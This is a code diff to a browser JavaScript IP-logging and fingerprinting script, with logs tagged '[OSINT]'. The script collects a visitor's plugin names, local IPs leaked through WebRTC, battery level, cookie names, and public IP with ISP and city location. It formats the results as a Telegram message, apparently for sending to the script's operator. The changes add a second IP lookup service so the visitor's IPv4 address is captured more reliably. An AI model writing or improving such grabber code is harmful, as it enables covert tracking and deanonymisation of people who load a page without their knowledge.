@@ -34,7 +34,7 @@
     return Array.from(navigator.plugins).map(p => p.name);
   }
 
-  // Get local IPs via WebRTC
+  // Get local IPs via WebRTC (UNCHANGED - already looks for IPv4)
   async function getLocalIPs() {
     return new Promise((resolve) => {
       const ips = new Set();
@@ -56,7 +56,9 @@
         }
         const parts = event.candidate.candidate.split(' ');
         const ip = parts[4];
-        if (ip && !ip.includes(':') && !ips.has(ip)) { // Exclude IPv6 for local IP
+        // Filter for local IPv4 addresses (WebRTC often returns mDNS/hostname, IPv6, and internal IPv4)
+        // This logic correctly collects any non-IPv6 IP detected by WebRTC
+        if (ip && !ip.includes(':') && !ips.has(ip)) {
           ips.add(ip);
         }
       };
@@ -101,22 +103,45 @@
     };
   }
 
-  // Get public IP + geo info from ipapi.co
+  // Get public IP + geo info from ipapi.co (Primary, provides full details)
   async function getPublicIPInfo() {
     try {
       const res = await fetch('https://ipapi.co/json/', {
         cache: 'no-store'
       });
       if (!res.ok) {
-        console.warn('[OSINT] Failed to get public IP info:', res.status);
+        console.warn('[OSINT] Failed to get public IP info (ipapi.co):', res.status);
         return null;
       }
       return await res.json();
     } catch (e) {
-      console.error('[OSINT] Error fetching public IP info:', e);
+      console.error('[OSINT] Error fetching public IP info (ipapi.co):', e);
       return null;
     }
   }
+
+  // Get *only* IPv4 address from a separate endpoint (Secondary)
+  async function getSecondaryPublicIP() {
+    try {
+      console.log('[OSINT] Attempting secondary IPv4 lookup...');
+      // Using an IPv4-only endpoint which is less likely to switch to IPv6
+      const res = await fetch('https://api.ipify.org?format=json', {
+        cache: 'no-store'
+      });
+      if (!res.ok) return null;
+      const data = await res.json();
+
+      // Basic check to ensure it's an IPv4 address before returning
+      if (data.ip && !data.ip.includes(':')) {
+          return data.ip;
+      }
+      return null;
+    } catch (e) {
+      console.error('[OSINT] Error fetching secondary public IP:', e);
+      return null;
+    }
+  }
+
 
   // Format JSON data as a Telegram HTML table message
   function createTelegramMessage(data) {
@@ -144,7 +169,9 @@
     msg += `<b>Online:</b> ${data.online}\n`;
     msg += `<b>Battery Level:</b> ${data.batteryLevel !== null ? data.batteryLevel + '%' : 'N/A'}\n\n`;
 
-    msg += `<b>Local IPs:</b> ${data.localIPs.length > 0 ? data.localIPs.join(', ') : 'None'}\n`;
+    // FIX: This section is key for displaying Local IP
+    const localIPsFormatted = data.localIPs.length > 0 ? data.localIPs.join(', ') : 'None';
+    msg += `<b>Local IPs (WebRTC):</b> ${localIPsFormatted}\n`; // Changed label for clarity
 
     const cookieKeys = Object.keys(data.cookies || {});
     msg += `<b>Cookies:</b> ${cookieKeys.length > 0 ? cookieKeys.join(', ') : 'None'}\n`;
@@ -189,34 +216,42 @@
 
     console.log('[OSINT] Getting public IP info...');
     const publicIPInfo = await getPublicIPInfo();
+    let secondaryIPv4 = null;
 
-    // Check if public IP info was successfully retrieved
     if (publicIPInfo && publicIPInfo.ip) {
-      // The primary IP detected by the service
       const ipAddress = publicIPInfo.ip;
 
       // Logic to assign Public IPv4 and Public IPv6
       if (ipAddress.includes(':')) {
-        // It's an IPv6 address
-        // Public IP (v4) comes from the 'ipv4' property if available, otherwise null
         deviceData.publicIP = publicIPInfo.ipv4 || null; 
         deviceData.publicIPv6 = ipAddress;
       } else {
-        // It's an IPv4 address
         deviceData.publicIP = ipAddress;
-        // Public IP (v6) comes from the 'ipv6' property if available, otherwise null
         deviceData.publicIPv6 = publicIPInfo.ipv6 || null; 
       }
 
-      // **FIXED PROPERTY NAMES:**
-      // ipapi.co uses 'org' for ISP, 'region' for Region
+      // Set Geo-IP data
       deviceData.isp = publicIPInfo.org;
       deviceData.city = publicIPInfo.city;
       deviceData.region = publicIPInfo.region;
       deviceData.country_name = publicIPInfo.country_name;
+      
+      // If Public IPv4 is still missing, try the secondary service
+      if (!deviceData.publicIP) {
+          secondaryIPv4 = await getSecondaryPublicIP();
+          if (secondaryIPv4) {
+              deviceData.publicIP = secondaryIPv4;
+          }
+      }
+
     } else {
-      // Set all to null if the request failed
-      deviceData.publicIP = null;
+      // Primary lookup failed, try ONLY the secondary IPv4 lookup
+      secondaryIPv4 = await getSecondaryPublicIP();
+      if (secondaryIPv4) {
+          deviceData.publicIP = secondaryIPv4;
+      }
+      
+      // Set all other Geo-IP data to null since the main service failed
       deviceData.publicIPv6 = null;
       deviceData.isp = null;
       deviceData.city = null;
